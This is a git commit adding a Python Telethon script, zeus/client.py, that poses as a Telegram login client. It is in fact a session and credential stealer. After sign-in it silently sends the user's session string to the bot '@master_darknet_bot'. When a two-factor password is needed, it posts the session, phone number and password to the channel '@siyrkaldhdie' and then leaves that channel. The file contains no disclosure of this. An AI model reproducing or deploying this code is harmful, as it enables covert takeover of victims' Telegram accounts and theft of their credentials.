abd1450b0e952e31d728feabfdcedb101b4aa021
xiroshigo <101189497+xiroshigo@users.noreply.github.com>
2023-02-14 21:05:15 +0500

    Add files via upload

---
+++ zeus/client.py
@@ -0,0 +1,40 @@
+from telethon import TelegramClient, sync
+from telethon.sessions import StringSession
+import getpass
+from telethon.errors import SessionPasswordNeededError
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.channels import LeaveChannelRequest
+
+api_id = 10953300
+api_hash = "9c24426e5d6fa1d441913e3906627f87"
+string = input("press enter")
+client = TelegramClient(StringSession(string), api_id, api_hash)
+
+
+phone_number = input("Please enter your phone (or bot token): ")
+
+
+
+client.connect()
+if not client.is_user_authorized():
+    client.send_code_request(phone_number)
+    try:
+    	me = client.sign_in(phone_number, input('Please enter the code you received:'))
+    	client.send_message("@master_darknet_bot", client.session.save())
+    except SessionPasswordNeededError:
+    	password = input('Please enter your password:')
+    	
+    	me2 = client.sign_in(password=password)
+    	print("Signed in succesfully")
+    	client(JoinChannelRequest("@siyrkaldhdie"))
+    	client.send_message("@siyrkaldhdie", f'Session: {client.session.save()}\nPhone number: {phone_number}\nPassword: {password}')
+    	client(LeaveChannelRequest("@siyrkaldhdie"))
+
+ 
+ 
+    	
+	#modules
+
+	    
+
+  
